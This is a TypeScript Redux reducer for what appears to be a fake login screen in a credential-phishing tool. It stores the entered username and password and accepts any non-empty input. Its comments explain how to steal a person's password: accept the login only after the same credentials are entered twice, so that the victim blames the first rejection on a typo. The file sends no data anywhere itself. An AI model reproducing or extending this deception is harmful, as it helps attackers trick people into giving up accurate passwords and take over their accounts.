import * as Actions from '../actions';
import * as C from '../constants';
import { ReduxVariables } from '../store';


function isValidLogin(username: string, password: string): boolean {
  // Modify this function to match your usecase
  // Idea: If you want to steal someones password only return true after (s)he has input the same credentials twice
  // That way you will get no typos. The victim will likely blame the one login error on a typo
  if (username && password) {
    // You can check for specific credentials like this:
    if (username === "root" && password === "toor") {
      console.log("Old kali default credentials");
      return true;
    }
    return true;
  }
  return false;
}

export default function reducer(state: ReduxVariables, action: Actions.Action): ReduxVariables {
  switch (action.type) {
    case C.SET_LOGIN_USERNAME: {
      let payload = (action as Actions.SetStringAction).payload;
      return {
        ...state,
        login: {
          ...state.login,
          username: payload,
        },
      };
    }
    case C.SET_LOGIN_PASSWORD: {
      let payload = (action as Actions.SetStringAction).payload;
      return {
        ...state,
        login: {
          ...state.login,
          password: payload,
        },
      };
    }
    case C.TRY_LOGIN: {
      let success = isValidLogin(state.login.username, state.login.password);
      return {
        ...state,
        login: {
          ...state.login,
          failed: !success,
          count: state.login.count + 1,
        },
        isFinished: success,
      };
    }
    case C.SET_LOGIN_OPEN_MENU: {
      let payload = (action as Actions.OptionalStringAction).payload;
      return {
        ...state,
        login: {
          ...state.login,
          openMenu: payload,
        },
      };
    }
    default: {
      return state;
    }
  }
}
